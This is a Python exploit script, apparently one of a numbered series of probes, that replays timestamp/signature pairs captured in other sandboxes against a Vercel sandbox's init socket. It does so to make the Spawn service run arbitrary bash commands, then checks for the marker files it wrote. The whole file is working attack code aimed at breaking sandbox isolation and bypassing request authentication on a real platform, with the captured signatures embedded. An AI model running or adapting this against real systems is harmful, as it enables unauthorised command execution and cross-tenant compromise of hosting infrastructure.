# -*- coding: utf-8 -*-
"""v209 payload: 旧签名重放测试 (跨沙箱 + ts 新鲜度)
用 v207/v205 捕获的旧 (ts, sig) + 任意 body 直接连 init.sock 重放
若成功 -> 签名无新鲜度检查/窗口大 + 签名跨沙箱通用"""
import socket, time, signal, os

signal.alarm(60)
SOCKPATH = '/run/vercel/share/init.sock'
LOG = '/vercel/sandbox/v209.log'
f = open(LOG, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    f.write(line + '\n')
    f.flush()
    print(line, flush=True)


PATH = '/vercel.sandbox.spawn.v1.SpawnService/Spawn'


def varint(n):
    out = b''
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out += bytes([b | 0x80])
        else:
            return out + bytes([b])


def proto_str(field, s):
    b = s.encode() if isinstance(s, str) else s
    return bytes([field << 3 | 2]) + varint(len(b)) + b


def build_body(command, args, cwd='/vercel/sandbox'):
    proto = proto_str(1, command)
    for a in args:
        proto += proto_str(2, a)
    proto += proto_str(4, cwd)
    return b'\x00\x00\x00\x00' + bytes([len(proto)]) + proto


def build_req(ts, sig, body):
    h = ('POST %s HTTP/1.1\r\nHost: localhost\r\nUser-Agent: connect-go/1.20.0 (go1.25.14)\r\n' % PATH).encode()
    h += b'Content-Length: %d\r\nAccept-Encoding: identity\r\nConnect-Accept-Encoding: gzip\r\n' % len(body)
    h += b'Connect-Protocol-Version: 1\r\nContent-Type: application/connect+proto\r\n'
    h += b'X-Signature: %s\r\nX-Timestamp: %s\r\n\r\n' % (sig.encode(), ts.encode())
    return h + body


def punix(req, t=6):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(t)
    s.connect(SOCKPATH)
    s.sendall(req)
    d = b''
    try:
        while True:
            x = s.recv(65536)
            if not x:
                break
            d += x
            if len(d) > 8000:
                break
    except Exception:
        pass
    s.close()
    return d[:6000]


log('=== v209 start ===')
# 旧样本: (ts, sig, source) - v207/v205 沙箱捕获
samples = [
    ('1788232805', 'zPiO7TSujOs+hmuh0mzr9y2WNUl5QPfACzcXIKYyvtpXFgQG/IJ1flsOCBHqvqdbss0IknOa35CXJidXXHnXAw==', 'v207'),
    ('1788232195', 'JTaYw1xwi//FtVYx1pdXudGsJXXzMOxj3uwILNAuXh4IVYB6gfX3/srgLQZ9g/M+fj/jtqIi0YHQ7ojaO/21DA==', 'v205'),
]
for ts, sig, src in samples:
    body = build_body('bash', ['-c', 'echo V209-%s > /tmp/v209_%s && id >> /tmp/v209_%s' % (src, src, src)])
    req = build_req(ts, sig, body)
    try:
        r = punix(req)
        log('REPLAY %s ts=%s -> %r' % (src, ts, r[:500]))
    except Exception as e:
        log('REPLAY %s EXC %s' % (src, e))
    time.sleep(1)

# 检查写文件
try:
    for fn in ['/tmp/v209_v207', '/tmp/v209_v205']:
        if os.path.exists(fn):
            log('FILE %s EXISTS: %r' % (fn, open(fn).read()))
        else:
            log('FILE %s MISSING' % fn)
except Exception as e:
    log('CHECK EXC %s' % e)
log('V209_DONE')
f.close()
